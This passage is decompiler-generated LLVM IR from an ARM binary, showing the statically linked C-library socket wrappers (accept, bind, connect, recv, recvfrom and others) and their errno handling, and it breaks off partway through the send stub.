  %v3_1ae28 = load i32, i32* @r7, align 4
  store i32 %v3_1ae28, i32* %stack_var_-8, align 4
  %v0_1ae34 = load i32, i32* @r0, align 4
  store i32 %v0_1ae34, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ae34, -4095
  br i1 %tmp, label %dec_label_pc_1ae5c, label %dec_label_pc_1ae44

dec_label_pc_1ae44:                               ; preds = %entry
  %v0_1ae48 = call i32 @__aeabi_read_tp()
  %v3_1ae4c = load i16, i16* @global_var_2c068.414, align 2
  %v4_1ae4c = sext i16 %v3_1ae4c to i32
  %v0_1ae50 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ae50 = sub i32 0, %v0_1ae50
  store i32 %v1_1ae50, i32* %r2.global-to-local, align 4
  %v3_1ae54 = add i32 %v4_1ae4c, %v0_1ae48
  %v4_1ae54 = inttoptr i32 %v3_1ae54 to i32*
  store i32 %v1_1ae50, i32* %v4_1ae54, align 4
  %v2_1ae5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1ae5c

dec_label_pc_1ae5c:                               ; preds = %entry, %dec_label_pc_1ae44
  %v1_1ae60 = phi i32 [ %v0_1ae34, %entry ], [ -1, %dec_label_pc_1ae44 ]
  %v2_1ae5c = phi i32 [ %v3_1ae28, %entry ], [ %v2_1ae5c.pre, %dec_label_pc_1ae44 ]
  store i32 %v2_1ae5c, i32* @r7, align 4
  ret i32 %v1_1ae60

; uselistorder directives
  uselistorder i32 %v0_1ae34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ae5c, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1ae64:
  %v0_1ae64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ae64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ae64
  %v2_1ae64 = load i32, i32* @sp, align 4
  %v8_1ae64 = shl i32 %v2_1ae64, %arg2
  %v9_1ae64 = and i32 %v8_1ae64, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ae64, %bb
  %v10_1ae68 = phi i32 [ %arg1, %dec_label_pc_1ae64 ], [ %v9_1ae64, %bb ]
  ret i32 %v10_1ae68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1ae70 = load i32, i32* @r4, align 4
  store i32 %v3_1ae70, i32* %stack_var_-20, align 4
  %v6_1ae70 = load i32, i32* @r5, align 4
  %v9_1ae70 = load i32, i32* @r6, align 4
  %v12_1ae70 = load i32, i32* @r7, align 4
  %v4_1ae7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1ae80 = icmp eq i32 %v4_1ae7c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_1ae80, label %dec_label_pc_1ae98, label %entry.dec_label_pc_1aea4_crit_edge

entry.dec_label_pc_1aea4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1aea4

dec_label_pc_1ae98:                               ; preds = %entry
  store i32 %v3_1ae70, i32* @r4, align 4
  store i32 %v9_1ae70, i32* @r6, align 4
  store i32 %v12_1ae70, i32* @r7, align 4
  %v0_1aea0 = call i32 @__sys_accept()
  br label %dec_label_pc_1aea4

dec_label_pc_1aea4:                               ; preds = %entry.dec_label_pc_1aea4_crit_edge, %dec_label_pc_1ae98
  %v0_1aea4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1aea4, i32* @r5, align 4
  %v0_1aeb4 = load i32, i32* @r4, align 4
  store i32 %v0_1aeb4, i32* @r0, align 4
  %v0_1aeb8 = call i32 @__sys_accept()
  store i32 %v0_1aeb8, i32* @r4, align 4
  %v0_1aec0 = load i32, i32* @r5, align 4
  %v1_1aec4 = call i32 @__libc_disable_asynccancel(i32 %v0_1aec0)
  %v0_1aec8 = load i32, i32* @r4, align 4
  %v2_1aed0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1aed0, i32* @r4, align 4
  store i32 %v6_1ae70, i32* @r5, align 4
  store i32 %v9_1ae70, i32* @r6, align 4
  store i32 %v12_1ae70, i32* @r7, align 4
  ret i32 %v0_1aec8

; uselistorder directives
  uselistorder label %dec_label_pc_1aea4, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1aee0 = load i32, i32* @r7, align 4
  store i32 %v3_1aee0, i32* %stack_var_-8, align 4
  %v0_1aeec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1aeec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1aeec, -4095
  br i1 %tmp, label %dec_label_pc_1af14, label %dec_label_pc_1aefc

dec_label_pc_1aefc:                               ; preds = %entry
  %v0_1af00 = call i32 @__aeabi_read_tp()
  %v3_1af04 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1af04 = sext i16 %v3_1af04 to i32
  %v0_1af08 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af08 = sub i32 0, %v0_1af08
  store i32 %v1_1af08, i32* %r2.global-to-local, align 4
  %v3_1af0c = add i32 %v4_1af04, %v0_1af00
  %v4_1af0c = inttoptr i32 %v3_1af0c to i32*
  store i32 %v1_1af08, i32* %v4_1af0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1af14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1af14

dec_label_pc_1af14:                               ; preds = %entry, %dec_label_pc_1aefc
  %v1_1af18 = phi i32 [ %v0_1aeec, %entry ], [ -1, %dec_label_pc_1aefc ]
  %v2_1af14 = phi i32 [ %v3_1aee0, %entry ], [ %v2_1af14.pre, %dec_label_pc_1aefc ]
  store i32 %v2_1af14, i32* @r7, align 4
  ret i32 %v1_1af18

; uselistorder directives
  uselistorder i32 %v0_1aeec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1af14, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1af1c:
  %v0_1af1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1af1c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1af1c
  %v2_1af1c = load i32, i32* @sl, align 4
  %v8_1af1c = shl i32 %v2_1af1c, %arg2
  %v9_1af1c = and i32 %v8_1af1c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1af1c, %bb
  %v10_1af20 = phi i32 [ %arg1, %dec_label_pc_1af1c ], [ %v9_1af1c, %bb ]
  ret i32 %v10_1af20

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1af24 = load i32, i32* @r7, align 4
  store i32 %v3_1af24, i32* %stack_var_-8, align 4
  %v0_1af30 = load i32, i32* @r0, align 4
  store i32 %v0_1af30, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1af30, -4095
  br i1 %tmp, label %dec_label_pc_1af58, label %dec_label_pc_1af40

dec_label_pc_1af40:                               ; preds = %entry
  %v0_1af44 = call i32 @__aeabi_read_tp()
  %v3_1af48 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1af48 = sext i16 %v3_1af48 to i32
  %v0_1af4c = load i32, i32* %r2.global-to-local, align 4
  %v1_1af4c = sub i32 0, %v0_1af4c
  store i32 %v1_1af4c, i32* %r2.global-to-local, align 4
  %v3_1af50 = add i32 %v4_1af48, %v0_1af44
  %v4_1af50 = inttoptr i32 %v3_1af50 to i32*
  store i32 %v1_1af4c, i32* %v4_1af50, align 4
  %v2_1af58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1af58

dec_label_pc_1af58:                               ; preds = %entry, %dec_label_pc_1af40
  %v1_1af5c = phi i32 [ %v0_1af30, %entry ], [ -1, %dec_label_pc_1af40 ]
  %v2_1af58 = phi i32 [ %v3_1af24, %entry ], [ %v2_1af58.pre, %dec_label_pc_1af40 ]
  store i32 %v2_1af58, i32* @r7, align 4
  ret i32 %v1_1af5c

; uselistorder directives
  uselistorder i32 %v0_1af30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1af58, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1af60:
  %v0_1af60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1af60, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1af60
  %v2_1af60 = load i32, i32* @fp, align 4
  %v8_1af60 = shl i32 %v2_1af60, %arg2
  %v9_1af60 = and i32 %v8_1af60, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1af60, %bb
  %v10_1af64 = phi i32 [ %arg1, %dec_label_pc_1af60 ], [ %v9_1af60, %bb ]
  ret i32 %v10_1af64

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1af6c = load i32, i32* @r4, align 4
  store i32 %v3_1af6c, i32* %stack_var_-20, align 4
  %v6_1af6c = load i32, i32* @r5, align 4
  %v9_1af6c = load i32, i32* @r6, align 4
  %v12_1af6c = load i32, i32* @r7, align 4
  %v4_1af78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  store i32 %v4_1af78, i32* @ip, align 4
  %v2_1af7c = icmp eq i32 %v4_1af78, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_1af7c, label %dec_label_pc_1af94, label %entry.dec_label_pc_1afa0_crit_edge

entry.dec_label_pc_1afa0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1afa0

dec_label_pc_1af94:                               ; preds = %entry
  store i32 %v3_1af6c, i32* @r4, align 4
  store i32 %v9_1af6c, i32* @r6, align 4
  store i32 %v12_1af6c, i32* @r7, align 4
  %v0_1af9c = call i32 @__sys_connect()
  br label %dec_label_pc_1afa0

dec_label_pc_1afa0:                               ; preds = %entry.dec_label_pc_1afa0_crit_edge, %dec_label_pc_1af94
  %v0_1afa0 = call i32 @__libc_enable_asynccancel()
  %v0_1afa4 = load i32, i32* @r6, align 4
  store i32 %v0_1afa4, i32* @r1, align 4
  store i32 %v0_1afa0, i32* @r5, align 4
  %v0_1afb0 = load i32, i32* @r4, align 4
  store i32 %v0_1afb0, i32* @r0, align 4
  %v0_1afb4 = call i32 @__sys_connect()
  store i32 %v0_1afb4, i32* @r4, align 4
  %v0_1afbc = load i32, i32* @r5, align 4
  %v1_1afc0 = call i32 @__libc_disable_asynccancel(i32 %v0_1afbc)
  %v0_1afc4 = load i32, i32* @r4, align 4
  %v2_1afcc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1afcc, i32* @r4, align 4
  store i32 %v6_1af6c, i32* @r5, align 4
  store i32 %v9_1af6c, i32* @r6, align 4
  store i32 %v12_1af6c, i32* @r7, align 4
  ret i32 %v0_1afc4

; uselistorder directives
  uselistorder label %dec_label_pc_1afa0, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1afdc = load i32, i32* @r7, align 4
  store i32 %v3_1afdc, i32* %stack_var_-8, align 4
  %v0_1afe8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1afe8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1afe8, -4095
  br i1 %tmp, label %dec_label_pc_1b010, label %dec_label_pc_1aff8

dec_label_pc_1aff8:                               ; preds = %entry
  %v0_1affc = call i32 @__aeabi_read_tp()
  %v3_1b000 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b000 = sext i16 %v3_1b000 to i32
  %v0_1b004 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b004 = sub i32 0, %v0_1b004
  store i32 %v1_1b004, i32* %r2.global-to-local, align 4
  %v3_1b008 = add i32 %v4_1b000, %v0_1affc
  %v4_1b008 = inttoptr i32 %v3_1b008 to i32*
  store i32 %v1_1b004, i32* %v4_1b008, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b010.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b010

dec_label_pc_1b010:                               ; preds = %entry, %dec_label_pc_1aff8
  %v1_1b014 = phi i32 [ %v0_1afe8, %entry ], [ -1, %dec_label_pc_1aff8 ]
  %v2_1b010 = phi i32 [ %v3_1afdc, %entry ], [ %v2_1b010.pre, %dec_label_pc_1aff8 ]
  store i32 %v2_1b010, i32* @r7, align 4
  ret i32 %v1_1b014

; uselistorder directives
  uselistorder i32 %v0_1afe8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b010, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b018:
  %v0_1b018 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b018, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b018
  %v2_1b018 = load i32, i32* @lr, align 4
  %v8_1b018 = shl i32 %v2_1b018, %arg2
  %v9_1b018 = and i32 %v8_1b018, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b018, %bb
  %v5_1b01c = phi i32 [ %arg1, %dec_label_pc_1b018 ], [ %v9_1b018, %bb ]
  ret i32 %v5_1b01c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b020 = load i32, i32* @r4, align 4
  store i32 %v3_1b020, i32* %stack_var_-12, align 4
  %v0_1b030 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b030, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b030, -4095
  br i1 %tmp, label %dec_label_pc_1b058, label %dec_label_pc_1b040

dec_label_pc_1b040:                               ; preds = %entry
  %v0_1b044 = call i32 @__aeabi_read_tp()
  %v3_1b048 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b048 = sext i16 %v3_1b048 to i32
  %v0_1b04c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b04c = sub i32 0, %v0_1b04c
  store i32 %v1_1b04c, i32* %r2.global-to-local, align 4
  %v3_1b050 = add i32 %v4_1b048, %v0_1b044
  %v4_1b050 = inttoptr i32 %v3_1b050 to i32*
  store i32 %v1_1b04c, i32* %v4_1b050, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b058.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b058

dec_label_pc_1b058:                               ; preds = %entry, %dec_label_pc_1b040
  %v1_1b05c = phi i32 [ %v0_1b030, %entry ], [ -1, %dec_label_pc_1b040 ]
  %v2_1b058 = phi i32 [ %v3_1b020, %entry ], [ %v2_1b058.pre, %dec_label_pc_1b040 ]
  store i32 %v2_1b058, i32* @r4, align 4
  ret i32 %v1_1b05c

; uselistorder directives
  uselistorder i32 %v0_1b030, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b058, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b060:
  %v0_1b060 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b060, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b060
  %v2_1b060 = load i32, i32* @r7, align 4
  %v5_1b060 = udiv i32 %v2_1b060, 4
  %v6_1b060 = and i32 %v5_1b060, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b060, %bb
  %v10_1b064 = phi i32 [ %arg1, %dec_label_pc_1b060 ], [ %v6_1b060, %bb ]
  ret i32 %v10_1b064

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b068 = load i32, i32* @r7, align 4
  store i32 %v3_1b068, i32* %stack_var_-8, align 4
  %v0_1b074 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b074, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b074, -4095
  br i1 %tmp, label %dec_label_pc_1b09c, label %dec_label_pc_1b084

dec_label_pc_1b084:                               ; preds = %entry
  %v0_1b088 = call i32 @__aeabi_read_tp()
  %v3_1b08c = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b08c = sext i16 %v3_1b08c to i32
  %v0_1b090 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b090 = sub i32 0, %v0_1b090
  store i32 %v1_1b090, i32* %r2.global-to-local, align 4
  %v3_1b094 = add i32 %v4_1b08c, %v0_1b088
  %v4_1b094 = inttoptr i32 %v3_1b094 to i32*
  store i32 %v1_1b090, i32* %v4_1b094, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1b09c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b09c

dec_label_pc_1b09c:                               ; preds = %entry, %dec_label_pc_1b084
  %v1_1b0a0 = phi i32 [ %v0_1b074, %entry ], [ -1, %dec_label_pc_1b084 ]
  %v2_1b09c = phi i32 [ %v3_1b068, %entry ], [ %v2_1b09c.pre, %dec_label_pc_1b084 ]
  store i32 %v2_1b09c, i32* @r7, align 4
  ret i32 %v1_1b0a0

; uselistorder directives
  uselistorder i32 %v0_1b074, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b09c, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b0a8 = load i32, i32* @r7, align 4
  store i32 %v3_1b0a8, i32* %stack_var_-8, align 4
  %v0_1b0b4 = load i32, i32* @r0, align 4
  store i32 %v0_1b0b4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b0b4, -4095
  br i1 %tmp, label %dec_label_pc_1b0dc, label %dec_label_pc_1b0c4

dec_label_pc_1b0c4:                               ; preds = %entry
  %v0_1b0c8 = call i32 @__aeabi_read_tp()
  %v3_1b0cc = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b0cc = sext i16 %v3_1b0cc to i32
  %v0_1b0d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0d0 = sub i32 0, %v0_1b0d0
  store i32 %v1_1b0d0, i32* %r2.global-to-local, align 4
  %v3_1b0d4 = add i32 %v4_1b0cc, %v0_1b0c8
  %v4_1b0d4 = inttoptr i32 %v3_1b0d4 to i32*
  store i32 %v1_1b0d0, i32* %v4_1b0d4, align 4
  %v2_1b0dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b0dc

dec_label_pc_1b0dc:                               ; preds = %entry, %dec_label_pc_1b0c4
  %v1_1b0e0 = phi i32 [ %v0_1b0b4, %entry ], [ -1, %dec_label_pc_1b0c4 ]
  %v2_1b0dc = phi i32 [ %v3_1b0a8, %entry ], [ %v2_1b0dc.pre, %dec_label_pc_1b0c4 ]
  store i32 %v2_1b0dc, i32* @r7, align 4
  ret i32 %v1_1b0e0

; uselistorder directives
  uselistorder i32 %v0_1b0b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b0dc, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b0e4:
  %v0_1b0e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b0e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b0e4
  %v5_1b0e4 = udiv i32 %arg2, 4
  %v6_1b0e4 = and i32 %v5_1b0e4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b0e4, %bb
  %v3_1b0e8 = phi i32 [ %arg1, %dec_label_pc_1b0e4 ], [ %v6_1b0e4, %bb ]
  ret i32 %v3_1b0e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1b0f0 = load i32, i32* @r4, align 4
  store i32 %v3_1b0f0, i32* %stack_var_-24, align 4
  %v6_1b0f0 = load i32, i32* @r5, align 4
  %v9_1b0f0 = load i32, i32* @r6, align 4
  %v12_1b0f0 = load i32, i32* @r7, align 4
  %v15_1b0f0 = load i32, i32* @r8, align 4
  %v18_1b0f0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @ip, align 4
  %v4_1b0fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1b100 = icmp eq i32 %v4_1b0fc, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_1b100, label %dec_label_pc_1b118, label %entry.dec_label_pc_1b120_crit_edge

entry.dec_label_pc_1b120_crit_edge:               ; preds = %entry
  br label %dec_label_pc_1b120

dec_label_pc_1b118:                               ; preds = %entry
  store i32 %v3_1b0f0, i32* @r4, align 4
  store i32 %v9_1b0f0, i32* @r6, align 4
  store i32 %v12_1b0f0, i32* @r7, align 4
  store i32 %v15_1b0f0, i32* @r8, align 4
  %v0_1b11c = call i32 @__sys_recv()
  br label %dec_label_pc_1b120

dec_label_pc_1b120:                               ; preds = %entry.dec_label_pc_1b120_crit_edge, %dec_label_pc_1b118
  %v0_1b120 = call i32 @__libc_enable_asynccancel()
  %v0_1b124 = load i32, i32* @r6, align 4
  store i32 %v0_1b124, i32* @r1, align 4
  store i32 %v0_1b120, i32* @r5, align 4
  %v0_1b134 = load i32, i32* @r4, align 4
  store i32 %v0_1b134, i32* @r0, align 4
  %v0_1b138 = call i32 @__sys_recv()
  store i32 %v0_1b138, i32* @r4, align 4
  %v0_1b140 = load i32, i32* @r5, align 4
  %v1_1b144 = call i32 @__libc_disable_asynccancel(i32 %v0_1b140)
  %v0_1b148 = load i32, i32* @r4, align 4
  %v2_1b14c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1b14c, i32* @r4, align 4
  store i32 %v6_1b0f0, i32* @r5, align 4
  store i32 %v9_1b0f0, i32* @r6, align 4
  store i32 %v12_1b0f0, i32* @r7, align 4
  store i32 %v15_1b0f0, i32* @r8, align 4
  store i32 %v18_1b0f0, i32* @lr, align 4
  ret i32 %v0_1b148

; uselistorder directives
  uselistorder label %dec_label_pc_1b120, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b15c = load i32, i32* @r4, align 4
  store i32 %v3_1b15c, i32* %stack_var_-16, align 4
  %v0_1b170 = load i32, i32* @r0, align 4
  store i32 %v0_1b170, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b170, -4095
  br i1 %tmp, label %dec_label_pc_1b198, label %dec_label_pc_1b180

dec_label_pc_1b180:                               ; preds = %entry
  %v0_1b184 = call i32 @__aeabi_read_tp()
  %v3_1b188 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1b188 = sext i16 %v3_1b188 to i32
  %v0_1b18c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b18c = sub i32 0, %v0_1b18c
  store i32 %v1_1b18c, i32* %r2.global-to-local, align 4
  %v3_1b190 = add i32 %v4_1b188, %v0_1b184
  %v4_1b190 = inttoptr i32 %v3_1b190 to i32*
  store i32 %v1_1b18c, i32* %v4_1b190, align 4
  %v2_1b198.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1b198

dec_label_pc_1b198:                               ; preds = %entry, %dec_label_pc_1b180
  %v1_1b19c = phi i32 [ %v0_1b170, %entry ], [ -1, %dec_label_pc_1b180 ]
  %v2_1b198 = phi i32 [ %v3_1b15c, %entry ], [ %v2_1b198.pre, %dec_label_pc_1b180 ]
  store i32 %v2_1b198, i32* @r4, align 4
  ret i32 %v1_1b19c

; uselistorder directives
  uselistorder i32 %v0_1b170, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b198, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1b1a4 = load i32, i32* @r4, align 4
  store i32 %v3_1b1a4, i32* %stack_var_-32, align 4
  %v6_1b1a4 = load i32, i32* @r5, align 4
  %v9_1b1a4 = load i32, i32* @r6, align 4
  %v12_1b1a4 = load i32, i32* @r7, align 4
  %v15_1b1a4 = load i32, i32* @r8, align 4
  %v18_1b1a4 = load i32, i32* @sb, align 4
  %v21_1b1a4 = load i32, i32* @sl, align 4
  %v24_1b1a4 = load i32, i32* @lr, align 4
  %v4_1b1b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 14008) to i32*), align 4
  %v2_1b1bc = icmp eq i32 %v4_1b1b4, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1b1bc, label %dec_label_pc_1b1dc, label %dec_label_pc_1b1e8

dec_label_pc_1b1dc:                               ; preds = %entry
  store i32 %v3_1b1a4, i32* @r4, align 4
  store i32 %v12_1b1a4, i32* @r7, align 4
  store i32 %v15_1b1a4, i32* @r8, align 4
  store i32 %v18_1b1a4, i32* %sb.global-to-local, align 4
  %v0_1b1e4 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1b1e8

dec_label_pc_1b1e8:                               ; preds = %entry, %dec_label_pc_1b1dc
  %v0_1b1e8 = call i32 @__libc_enable_asynccancel()
  %v0_1b1ec = load i32, i32* @r7, align 4
  store i32 %v0_1b1ec, i32* @r1, align 4
  store i32 %v0_1b1e8, i32* @r5, align 4
  %v0_1b1fc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1b1fc, i32* @r0, align 4
  %v0_1b204 = call i32 @__sys_recvfrom()
  store i32 %v0_1b204, i32* @r4, align 4
  %v0_1b20c = load i32, i32* @r5, align 4
  %v1_1b210 = call i32 @__libc_disable_asynccancel(i32 %v0_1b20c)
  %v0_1b214 = load i32, i32* @r4, align 4
  %v2_1b21c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1b21c, i32* @r4, align 4
  store i32 %v6_1b1a4, i32* @r5, align 4
  store i32 %v9_1b1a4, i32* @r6, align 4
  store i32 %v12_1b1a4, i32* @r7, align 4
  store i32 %v15_1b1a4, i32* @r8, align 4
  store i32 %v18_1b1a4, i32* @sb, align 4
  store i32 %v21_1b1a4, i32* @sl, align 4
  store i32 %v24_1b1a4, i32* @lr, align 4
  ret i32 %v0_1b214

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b1e8, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b22c = load i32, i32* @r7, align 4
  store i32 %v3_1b22c, i32* %stack_var_-8, align 4
  %v0_1b238 = load i32, i32* @r0, align 4
  store i32 %v0_1b238, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1b238, -4095
  br i1 %tmp, label %dec_label_pc_1b260, label %dec_label_pc_1b248

dec_label_pc_1b248:                               ; preds = %entry
  %v0_1b24c = call i32 @__aeabi_read_tp()
